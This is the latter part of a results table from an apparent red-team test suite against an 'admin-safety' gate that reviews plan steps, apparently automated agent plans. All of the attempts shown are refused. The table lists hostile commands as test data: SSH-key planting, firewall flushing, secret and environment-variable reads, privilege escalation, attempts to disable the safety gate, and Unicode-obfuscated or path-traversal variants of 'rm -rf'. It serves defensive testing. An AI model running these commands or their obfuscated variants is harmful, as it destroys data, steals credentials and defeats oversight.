| 84 | access | `galion-tuner` | `ssh-keygen -f /tmp/k -N ''` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 85 | access | `galion-tuner` | `ssh-copy-id slavik@box` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 86 | access | `galion-tuner` | `echo ssh-ed25519 AAAA >> ~/.ssh/authorized_keys` | Refused | Refused: admin-safety: admin account/access change refused (authorized_keys) |
| 87 | access | `galion-tuner` | `cp /tmp/k /root/.ssh/authorized_keys2` | Refused | Refused: admin-safety: admin account/access change refused (authorized_keys) |
| 88 | access | `galion-tuner` | `chattr +i /etc/resolv.conf` | Refused | Refused: admin-safety: admin account/access change refused (attribute change) |
| 89 | access | `galion-tuner` | `usermod -L slavik` | Refused | Refused: admin-safety: admin account/access change refused (usermod) |
| 90 | access | `galion-tuner` | `passwd -l root` | Refused | Refused: admin-safety: admin account/access change refused (passwd) |
| 91 | access | `galion-tuner` | `echo slavik:x \| chpasswd` | Refused | Refused: admin-safety: admin account/access change refused (chpasswd) |
| 92 | access | `galion-tuner` | `iptables -F` | Refused | Refused: admin-safety: admin account/access change refused (firewall) |
| 93 | access | `galion-tuner` | `iptables-restore < /tmp/r` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 94 | access | `galion-tuner` | `nft flush ruleset` | Refused | Refused: admin-safety: admin account/access change refused (firewall) |
| 95 | access | `galion-tuner` | `ip link set eth0 down` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 96 | access | `galion-tuner` | `ip route del default` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 97 | access | `galion-tuner` | `cat /opt/galion/galion-light/secrets/github` | Refused | Refused: admin-safety: secret exposure refused (secrets dir) |
| 98 | access | `galion-tuner` | `ls /opt/galion/galion-light/secrets` | Refused | Refused: admin-safety: secret exposure refused (secrets dir) |
| 99 | access | `galion-tuner` | `tar -cf /tmp/s.tar /root/galion-secrets` | Refused | Refused: admin-safety: secret exposure refused (secrets dir) |
| 100 | access | `galion-tuner` | `cat /root/.config/gh/hosts.yml` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 101 | access | `galion-tuner` | `cat /etc/cloudflared/cert.pem` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 102 | access | `galion-tuner` | `cat ~/.cloudflared/x.json` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 103 | access | `galion-tuner` | `cat /proc/self/environ` | Refused | Refused: admin-safety: secret exposure refused (process environment) |
| 104 | access | `galion-tuner` | `strings /proc/1/environ` | Refused | Refused: admin-safety: secret exposure refused (process environment) |
| 105 | access | `galion-tuner` | `gpg --export-secret-keys` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 106 | access | `galion-tuner` | `setcap cap_sys_admin+ep /tmp/p` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 107 | access | `galion-tuner` | `chmod u+s /tmp/p` | Refused | Refused: admin-safety: admin account/access change refused (permission change) |
| 108 | access | `galion-tuner` | `sysctl -w kernel.modules_disabled=1` | Refused | Refused: admin-safety: not an allow-listed plan step (character not allowed in a plan step (letters, digits, space and . , : / _ - ( ) only)) |
| 109 | access | `galion-tuner` | `modprobe -r e1000` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 110 | access | `galion-tuner` | `kill -9 1` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 111 | access | `galion-tuner` | `pkill sshd` | Refused | Refused: admin-safety: admin account/access change refused (sshd) |
| 112 | access | `galion-tuner` | `touch /opt/galion/hades/DISABLED` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 113 | access | `galion-tuner` | `curl -X POST http://127.0.0.1:19410/v1/stop` | Refused | Refused: admin-safety: not an allow-listed plan step (plan step is not an allow-listed verb) |
| 114 | unicode | `galion-tuner` | `rU+043C -rf /var/lib/galion` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 115 | unicode | `galion-tuner` | `rmU+00A0-rf /var/lib/galion` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 116 | unicode | `galion-tuner` | `rm -rf /var/lib/galionU+200B` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 117 | unicode | `galion-tuner` | `U+FF52U+FF4D -rf /` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 118 | unicode | `galion-tuner` | `rm U+2010rf /var/lib/galion` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 119 | unicode | `galion-tuner` | `restart galion-tunerU+202Efr- mr` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 120 | unicode | `galion-tuner` | `rm -rf /\r` | Refused | Refused: admin-safety: plan cannot be reviewed (non-printable or non-ASCII bytes) |
| 121 | unicode | `galion-tunU+0435r` | `restart galion-tuner` | Refused | Refused: malformed token: target name |
| 122 | unicode | `hU+0430des-gate` | `restart` | Refused | Refused: malformed token: target name |
| 123 | traversal | `galion-tuner` | `switch dist/bin to ../../etc` | Refused | Refused: admin-safety: not an allow-listed plan step (arguments do not fit the allow-listed step) |
| 124 | traversal | `galion-tuner` | `operator runs deploy/../../../tmp/p.sh` | Refused | Refused: admin-safety: not an allow-listed plan step (operator script (exact allow-list only)) |
| 125 | traversal | `galion-tuner` | `switch dist/bin to /etc/systemd/system` | Refused | Refused: admin-safety: not an allow-listed plan step (arguments do not fit the allow-listed step) |
| 126 | traversal | `galion-tuner` | `operator runs /tmp/p.sh` | Refused | Refused: admin-safety: not an allow-listed plan step (operator script (exact allow-list only)) |
| 127 | traversal | `galion-tuner` | `operator runs deploy/rollback.sh/../../tmp/p` | Refused | Refused: admin-safety: not an allow-listed plan step (operator script (exact allow-list only)) |
| 128 | traversal | `galion-tuner` | `switch dist/bin to dist/../../root` | Refused | Refused: admin-safety: not an allow-listed plan step (arguments do not fit the allow-listed step) |
| 129 | traversal | `../sshd` | `restart` | Refused | Refused: malformed token: target name |
| 130 | traversal | `galion-tuner/../../hades-gate` | `restart` | Refused | Refused: malformed token: target name |
| 131 | traversal | `..` | `restart` | Refused | Refused: admin-safety: not an allow-listed plan step (target name) |
| 132 | traversal | `galion-tuner..hades` | `restart` | Refused | Refused: admin-safety: protected target refused (hades) |
| 133 | traversal | `galion-tuner:22` | `restart` | Refused | Refused: admin-safety: not an allow-listed plan step (target name) |
| 134 | traversal | `root@galion-tuner` | `restart` | Refused | Refused: admin-safety: protected target refused (root) |
| 135 | traversal | `galion-tuner` | `restart galion-control` | Refused | Refused: admin-safety: secret exposure refused (galion-control key) |
| 136 | traversal | `galion-tuner` | `restart hades-gate` | Refused | Refused: admin-safety: not an allow-listed plan step (service name (ours only: galion-*, gaia-*, openmind-*, hermes-*)) |
| 137 | traversal | `galion-tuner` | `restart ssh` | Refused | Refused: admin-safety: admin account/access change refused (ssh) |

attacks: 138, bypasses (WouldApply): 0
